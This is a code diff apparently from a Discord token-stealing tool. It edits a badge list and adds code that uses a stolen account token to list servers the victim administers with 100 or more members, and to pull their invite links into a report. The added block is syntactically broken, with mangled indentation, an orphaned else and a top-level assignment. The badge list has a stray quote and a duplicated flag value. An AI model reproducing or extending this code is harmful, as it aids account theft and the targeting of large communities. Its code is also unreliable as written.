@@ -141,7 +141,7 @@ def Trust(Cookies):
         
 def GetUHQFriends(token):
     badgeList =  [
-        {"Name": 'Active_Developer', 'Value': 131072, 'Emoji': "<:active_developer:1041777282185953310> "},
+        {"Name": 'Verified_Bot_Developer"', 'Value': 131072, 'Emoji': "<:verified_dev:968704541702905886> "},
         {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
         {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
         {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
@@ -150,7 +150,8 @@ def GetUHQFriends(token):
         {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
         {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
         {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
-        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
+        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "},
+        {"Name": 'Active_Developer', 'Value': 2,'Emoji': "<:Active_Dev:1045024909690163210> "},
     ]
     headers = {
         "Authorization": token,
@@ -199,6 +200,35 @@ def GetBilling(token):
 
     return billing
 
+if guilds:
+                hq_guilds = []
+                for guild in guilds:
+                    admin = True if guild['permissions'] == '4398046511103' else False
+                    if admin and guild['approximate_member_count'] >= 100:
+                        owner = "<:fendi_IconTickGreen:939859785019432970>" if guild['owner'] else "<a:animatedcross:1045627878609530920>"
+
+                        invites = requests.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
+                        if len(invites) > 0:
+                            invite = f"https://discord.gg/{invites[0]['code']}"
+                        else:
+                            invite = "https://youtu.be/dQw4w9WgXcQ"
+
+                        data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
+                        
+                        if len('\n'.join(hq_guilds)) + len(data) >= 1024:
+                            break
+
+                        hq_guilds.append(data)
+
+                if len(hq_guilds) > 0:
+                    hq_guilds = '\n'.join(hq_guilds)
+                
+                else:
+                    hq_guilds = None
+
+            else:
+                
+hq_guilds = None
 
 def GetBadge(flags):
     if flags == 0: return ''
